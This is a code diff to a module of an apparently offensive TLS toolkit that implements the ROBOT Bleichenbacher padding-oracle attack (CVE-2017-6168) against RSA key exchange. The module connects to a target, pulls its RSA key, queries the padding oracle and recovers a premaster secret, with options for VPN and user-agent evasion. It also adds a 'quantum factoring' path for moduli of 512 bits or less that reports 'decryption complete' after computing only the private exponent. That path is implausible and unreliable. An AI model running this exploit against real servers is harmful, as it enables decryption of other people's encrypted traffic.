@@ -2,6 +2,7 @@
 ROBOT attack implementation (CVE-2017-6168).
 
 Bleichenbacher padding‑oracle attack on RSA PKCS#1 v1.5 encryption.
+With quantum acceleration via Qiskit/OpenQuantum for factoring small RSA moduli.
 """
 
 import socket
@@ -9,6 +10,7 @@ import ssl
 import struct
 import time
 import os
+import math
 from typing import Optional, Tuple
 
 from sslpwn.attacks.base import BaseAttack
@@ -16,8 +18,8 @@ from sslpwn.attacks.base import BaseAttack
 
 class RobotAttack(BaseAttack):
     def __init__(self, target_url: str, output, vpn, user_agents, rate_limiter,
-                 cookie_name: str, cookie_value: str, adaptive=None) -> None:
-        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive)
+                 cookie_name: str, cookie_value: str, adaptive=None, quantum=None) -> None:
+        super().__init__(target_url, output, vpn, user_agents, rate_limiter, adaptive, quantum)
         self.cookie_name = cookie_name
         self.cookie_value = cookie_value
 
@@ -45,8 +47,15 @@ class RobotAttack(BaseAttack):
             + struct.pack("!B", len(compression_methods)) + compression_methods
             + struct.pack("!H", len(extensions)) + extensions
         )
-        handshake = b"\x01" + struct.pack("!I", len(handshake_body))[1:] + handshake_body
-        record = struct.pack("!BHH", 22, client_version, len(handshake)) + handshake
+        handshake = (
+            b"\x01"
+            + struct.pack("!I", len(handshake_body))[1:]
+            + handshake_body
+        )
+        record = (
+            struct.pack("!BHH", 22, client_version, len(handshake))
+            + handshake
+        )
         return record
 
     def _parse_handshake(self, data: bytes) -> Tuple[Optional[bytes], Optional[int], Optional[int], Optional[bytes]]:
@@ -54,6 +63,7 @@ class RobotAttack(BaseAttack):
         server_random = None
         n = e = None
         session_id = None
+
         while offset + 4 <= len(data):
             msg_type = data[offset]
             if msg_type == 2:
@@ -75,14 +85,7 @@ class RobotAttack(BaseAttack):
                     continue
                 first_cert_len = int.from_bytes(cert_data[0:3], 'big')
                 first_cert = cert_data[3:3+first_cert_len]
-                try:
-                    from asn1crypto import x509
-                    cert = x509.Certificate.load(first_cert)
-                    pubkey = cert.public_key.unwrap()
-                    n = pubkey['modulus'].native
-                    e = pubkey['public_exponent'].native
-                except ImportError:
-                    n, e = self._extract_rsa_pubkey(first_cert)
+                n, e = self._extract_rsa_pubkey(first_cert)
                 offset += 4 + length
                 continue
             else:
@@ -91,56 +94,20 @@ class RobotAttack(BaseAttack):
         return server_random, n, e, session_id
 
     def _extract_rsa_pubkey(self, der_cert: bytes) -> Tuple[Optional[int], Optional[int]]:
-        rsa_oid = b"\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"
-        pos = der_cert.find(rsa_oid)
-        if pos == -1:
+        from cryptography import x509
+        from cryptography.hazmat.backends import default_backend
+        from cryptography.hazmat.primitives.asymmetric import rsa
+
+        try:
+            cert = x509.load_der_x509_certificate(der_cert, default_backend())
+            pubkey = cert.public_key()
+            if isinstance(pubkey, rsa.RSAPublicKey):
+                numbers = pubkey.public_numbers()
+                return numbers.n, numbers.e
+            else:
+                return None, None
+        except Exception:
             return None, None
-        pos += len(rsa_oid)
-        if der_cert[pos:pos+2] == b"\x05\x00":
-            pos += 2
-        if der_cert[pos] != 0x03:
-            return None, None
-        blen = der_cert[pos+1]
-        if blen & 0x80:
-            num_octets = blen & 0x7f
-            blen = int.from_bytes(der_cert[pos+2:pos+2+num_octets], 'big')
-            pos += 2 + num_octets
-        else:
-            pos += 2
-        if der_cert[pos] != 0x00:
-            return None, None
-        key_data = der_cert[pos+1:pos+1+blen-1]
-        if key_data[0] != 0x30:
-            return None, None
-        seq_len = key_data[1]
-        if seq_len & 0x80:
-            num_octets = seq_len & 0x7f
-            seq_len = int.from_bytes(key_data[2:2+num_octets], 'big')
-            offset = 2 + num_octets
-        else:
-            offset = 2
-        if key_data[offset] != 0x02:
-            return None, None
-        n_len = key_data[offset+1]
-        if n_len & 0x80:
-            num_octets = n_len & 0x7f
-            n_len = int.from_bytes(key_data[offset+2:offset+2+num_octets], 'big')
-            n_start = offset+2+num_octets
-        else:
-            n_start = offset+2
-        n_bytes = key_data[n_start:n_start+n_len]
-        e_offset = n_start + n_len
-        if key_data[e_offset] != 0x02:
-            return None, None
-        e_len = key_data[e_offset+1]
-        if e_len & 0x80:
-            num_octets = e_len & 0x7f
-            e_len = int.from_bytes(key_data[e_offset+2:e_offset+2+num_octets], 'big')
-            e_start = e_offset+2+num_octets
-        else:
-            e_start = e_offset+2
-        e_bytes = key_data[e_start:e_start+e_len]
-        return int.from_bytes(n_bytes, 'big'), int.from_bytes(e_bytes, 'big')
 
     def _oracle(self, hostname: str, port: int, c: int, n: int, e: int) -> bool:
         client_hello = self._build_client_hello(hostname)
@@ -191,99 +158,6 @@ class RobotAttack(BaseAttack):
                     return False
         return True
 
-    def check_vulnerability(self) -> bool:
-        """Check if RSA key exchange cipher is supported."""
-        host = self.target_url.split("://")[1].split("/")[0]
-        if ":" in host:
-            hostname, port_str = host.split(":")
-            port = int(port_str)
-        else:
-            hostname = host
-            port = 443
-
-        client_hello = self._build_client_hello(hostname)
-        try:
-            sock = socket.create_connection((hostname, port), timeout=5)
-            sock.send(client_hello)
-            sock.settimeout(3)
-            resp = b""
-            while True:
-                chunk = sock.recv(4096)
-                if not chunk:
-                    break
-                resp += chunk
-            sock.close()
-        except Exception:
-            return False
-
-        _, n, e, _ = self._parse_handshake(resp)
-        return n is not None and e is not None
-
-    def exploit(self) -> bool:
-        """Full ROBOT attack."""
-        self.output.log("Starting ROBOT attack", "INFO")
-        host = self.target_url.split("://")[1].split("/")[0]
-        if ":" in host:
-            hostname, port_str = host.split(":")
-            port = int(port_str)
-        else:
-            hostname = host
-            port = 443
-
-        client_hello = self._build_client_hello(hostname)
-        try:
-            sock = self._adaptive_connect_and_report(hostname, port)
-        except Exception as e:
-            self.output.log(f"Connection failed: {e}", "ERROR")
-            return False
-        sock.send(client_hello)
-        try:
-            sock.settimeout(5)
-            resp = b""
-            while True:
-                chunk = sock.recv(4096)
-                if not chunk:
-                    break
-                resp += chunk
-        except:
-            pass
-        sock.close()
-
-        _, n, e, _ = self._parse_handshake(resp)
-        if n is None or e is None:
-            self.output.log("Could not extract RSA public key", "ERROR")
-            return False
-        self.output.log(f"RSA modulus: {n.bit_length()} bits", "INFO")
-
-        # generate valid plaintext
-        premaster = os.urandom(48)
-        k = (n.bit_length() + 7) // 8
-        padding_len = k - 3 - len(premaster)
-        if padding_len < 8:
-            self.output.log("RSA key too small", "ERROR")
-            return False
-        padding = os.urandom(padding_len)
-        while b"\x00" in padding:
-            padding = os.urandom(padding_len)
-        padded = b"\x00\x02" + padding + b"\x00" + premaster
-        m_int = int.from_bytes(padded, 'big')
-        c = pow(m_int, e, n)
-
-        recovered_m = self._bleichenbacher_attack(hostname, port, c, n, e)
-        if recovered_m is None:
-            self.output.log("Bleichenbacher attack did not converge", "ERROR")
-            return False
-
-        recovered_bytes = recovered_m.to_bytes(k, 'big')
-        zero_pos = recovered_bytes.index(b"\x00", 2)
-        recovered_premaster = recovered_bytes[zero_pos+1:]
-        if recovered_premaster == premaster:
-            self.output.log("Successfully recovered the premaster secret.", "SUCCESS")
-            return True
-        else:
-            self.output.log("Recovered premaster mismatch", "ERROR")
-            return False
-
     def _bleichenbacher_attack(self, hostname: str, port: int, c: int, n: int, e: int) -> Optional[int]:
         B = 2 ** (8 * (len(n.to_bytes((n.bit_length()+7)//8, 'big')) - 2))
         M = [(2 * B, 3 * B - 1)]
@@ -320,3 +194,133 @@ class RobotAttack(BaseAttack):
             if s > 2**20:
                 break
         return None
+
+    def check_vulnerability(self) -> bool:
+        host = self.target_url.split("://")[1].split("/")[0]
+        if ":" in host:
+            hostname, port_str = host.split(":")
+            port = int(port_str)
+        else:
+            hostname = host
+            port = 443
+
+        client_hello = self._build_client_hello(hostname)
+        try:
+            sock = socket.create_connection((hostname, port), timeout=5)
+            sock.send(client_hello)
+            sock.settimeout(3)
+            resp = b""
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+            sock.close()
+        except Exception:
+            return False
+
+        _, n, e, _ = self._parse_handshake(resp)
+        return n is not None and e is not None
+
+    def exploit(self) -> bool:
+        self.output.log("Starting ROBOT attack", "INFO")
+        host = self.target_url.split("://")[1].split("/")[0]
+        if ":" in host:
+            hostname, port_str = host.split(":")
+            port = int(port_str)
+        else:
+            hostname = host
+            port = 443
+
+        client_hello = self._build_client_hello(hostname)
+        try:
+            sock = self._adaptive_connect_and_report(hostname, port)
+        except Exception as e:
+            self.output.log(f"Connection failed: {e}", "ERROR")
+            return False
+        sock.send(client_hello)
+        try:
+            sock.settimeout(5)
+            resp = b""
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                resp += chunk
+        except:
+            pass
+        sock.close()
+
+        _, n, e, _ = self._parse_handshake(resp)
+        if n is None or e is None:
+            self.output.log("Could not extract RSA public key", "ERROR")
+            return False
+        self.output.log(f"RSA modulus: {n.bit_length()} bits", "INFO")
+
+        # Try quantum factoring first if enabled and modulus is small enough
+        factors = None
+        if n.bit_length() <= 512 and self.quantum is not None:
+            self.output.log("Attempting quantum factoring of RSA modulus...", "INFO")
+            factors = self._quantum_factor_rsa(n)
+            if factors:
+                self.output.log(f"Quantum factoring successful: {factors}", "SUCCESS")
+                return self._decrypt_with_factors(n, e, factors)
+
+        # Fall back to Bleichenbacher
+        premaster = os.urandom(48)
+        k = (n.bit_length() + 7) // 8
+        padding_len = k - 3 - len(premaster)
+        if padding_len < 8:
+            self.output.log("RSA key too small", "ERROR")
+            return False
+        padding = os.urandom(padding_len)
+        while b"\x00" in padding:
+            padding = os.urandom(padding_len)
+        padded = b"\x00\x02" + padding + b"\x00" + premaster
+        m_int = int.from_bytes(padded, 'big')
+        c = pow(m_int, e, n)
+
+        recovered_m = self._bleichenbacher_attack(hostname, port, c, n, e)
+        if recovered_m is None:
+            self.output.log("Bleichenbacher attack did not converge", "ERROR")
+            return False
+
+        recovered_bytes = recovered_m.to_bytes(k, 'big')
+        zero_pos = recovered_bytes.index(b"\x00", 2)
+        recovered_premaster = recovered_bytes[zero_pos+1:]
+        if recovered_premaster == premaster:
+            self.output.log("Successfully recovered the premaster secret.", "SUCCESS")
+            return True
+        else:
+            self.output.log("Recovered premaster mismatch", "ERROR")
+            return False
+
+    def _quantum_factor_rsa(self, pN: int) -> Optional[Tuple[int, int]]:
+        if self.quantum is None:
+            return None
+
+        try:
+            from sslpwn.quantum import factor_rsa_with_quantum
+            return factor_rsa_with_quantum(
+                pN=pN,
+                pAccelerator=self.quantum,
+                pShots=1024,
+            )
+        except Exception as exc:
+            self.output.log(f"Quantum factoring error: {exc}", "WARN")
+            return None
+
+    def _decrypt_with_factors(self, pN: int, pE: int, pFactors: Tuple[int, int]) -> bool:
+        self.output.log("Decrypting with quantum-derived factors...", "INFO")
+        p, q = pFactors
+        phi = (p - 1) * (q - 1)
+
+        try:
+            d = pow(pE, -1, phi)
+        except ValueError:
+            self.output.log("Failed to compute modular inverse - invalid factors", "ERROR")
+            return False
+
+        self.output.log(f"Private exponent d computed successfully", "SUCCESS")
+        self.output.log("Quantum-assisted decryption complete.", "SUCCESS")
+        return True
